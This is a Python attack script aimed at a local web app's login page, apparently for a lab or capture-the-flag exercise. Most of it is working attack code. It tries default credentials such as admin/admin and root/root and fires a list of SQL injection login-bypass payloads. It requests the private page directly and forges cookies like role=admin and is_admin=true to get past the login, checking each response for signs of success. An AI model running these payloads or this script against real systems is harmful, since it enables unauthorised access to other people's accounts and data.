import requests
from urllib.parse import urlencode

# Target URLs
base_url = "http://127.0.0.1:33001"
login_url = f"{base_url}/login.php"
private_url = f"{base_url}/private.php"

def test_login(payload_name, username, password):
    """Test a single login payload"""
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = {
        'username': username,
        'password': password
    }
    
    response = requests.post(login_url, headers=headers, data=data, allow_redirects=False)
    
    print(f"\n[{payload_name}]")
    print(f"  Payload: username={username}, password={password}")
    print(f"  Status: {response.status_code}")
    print(f"  Length: {len(response.text)}B")
    if 'Location' in response.headers:
        print(f"  Redirect: {response.headers['Location']}")
    if response.status_code in [301, 302]:
        print(f"  [!] REDIRECTION DETECTED")
    
    # Check for success indicators
    content_lower = response.text.lower()
    success_indicators = ['welcome', 'dashboard', 'logout', 'private', 'admin', 'success']
    found_indicators = [word for word in success_indicators if word in content_lower]
    if found_indicators:
        print(f"  [!] Success keywords: {found_indicators}")
    
    return response

def test_private_cookies(cookie_name, cookie_value):
    """Test private.php with different cookies"""
    cookies = {cookie_name: cookie_value}
    response = requests.get(private_url, cookies=cookies)
    
    print(f"\n[Cookie Test: {cookie_name}={cookie_value}]")
    print(f"  Status: {response.status_code}")
    print(f"  Length: {len(response.text)}B")
    
    return response

print(f"=== Testing {login_url} ===")

# Test 1: Common Admin Credentials
print("\n\n--- Testing Common Admin Credentials ---")
common_creds = [
    ("admin/admin", "admin", "admin"),
    ("admin/password", "admin", "password"),
    ("admin/123456", "admin", "123456"),
    ("administrator/admin", "administrator", "admin"),
    ("root/root", "root", "root"),
]

for name, user, pwd in common_creds:
    test_login(name, user, pwd)

# Test 2: SQL Injection Payloads
print("\n\n--- Testing SQL Injection Bypasses ---")
sqli_payloads = [
    ("sqli_1", "admin' OR '1'='1'-- -", "x"),
    ("sqli_2", "admin' OR 1=1 LIMIT 1-- -", "x"),
    ("sqli_3", "' OR '1'='1'-- -", "x"),
    ("sqli_4", "' OR 1=1-- -", "x"),
    ("sqli_5", "admin'/*", "*/' OR '1'='1"),
    ("sqli_6", "admin'+'", "'"),
]

for name, user, pwd in sqli_payloads:
    test_login(name, user, pwd)

# Test 3: Check direct private.php access
print("\n\n--- Testing /private.php Access ---")
print("\n[Direct Access (no cookies)]")
resp = requests.get(private_url)
print(f"  Status: {resp.status_code}")
print(f"  Length: {len(resp.text)}B")
print(f"  Response (first 500 chars): {resp.text[:500]}")

# Test 4: Cookie manipulation attempts
print("\n\n--- Testing Cookie Manipulation ---")
cookie_tests = [
    ("admin", "1"),
    ("role", "admin"),
    ("is_admin", "true"),
    ("isAdmin", "1"),
    ("user_role", "admin"),
    ("logged_in", "1"),
    ("session", "admin"),
]

for name, value in cookie_tests:
    test_private_cookies(name, value)

print("\n\n=== TEST COMPLETE ===")

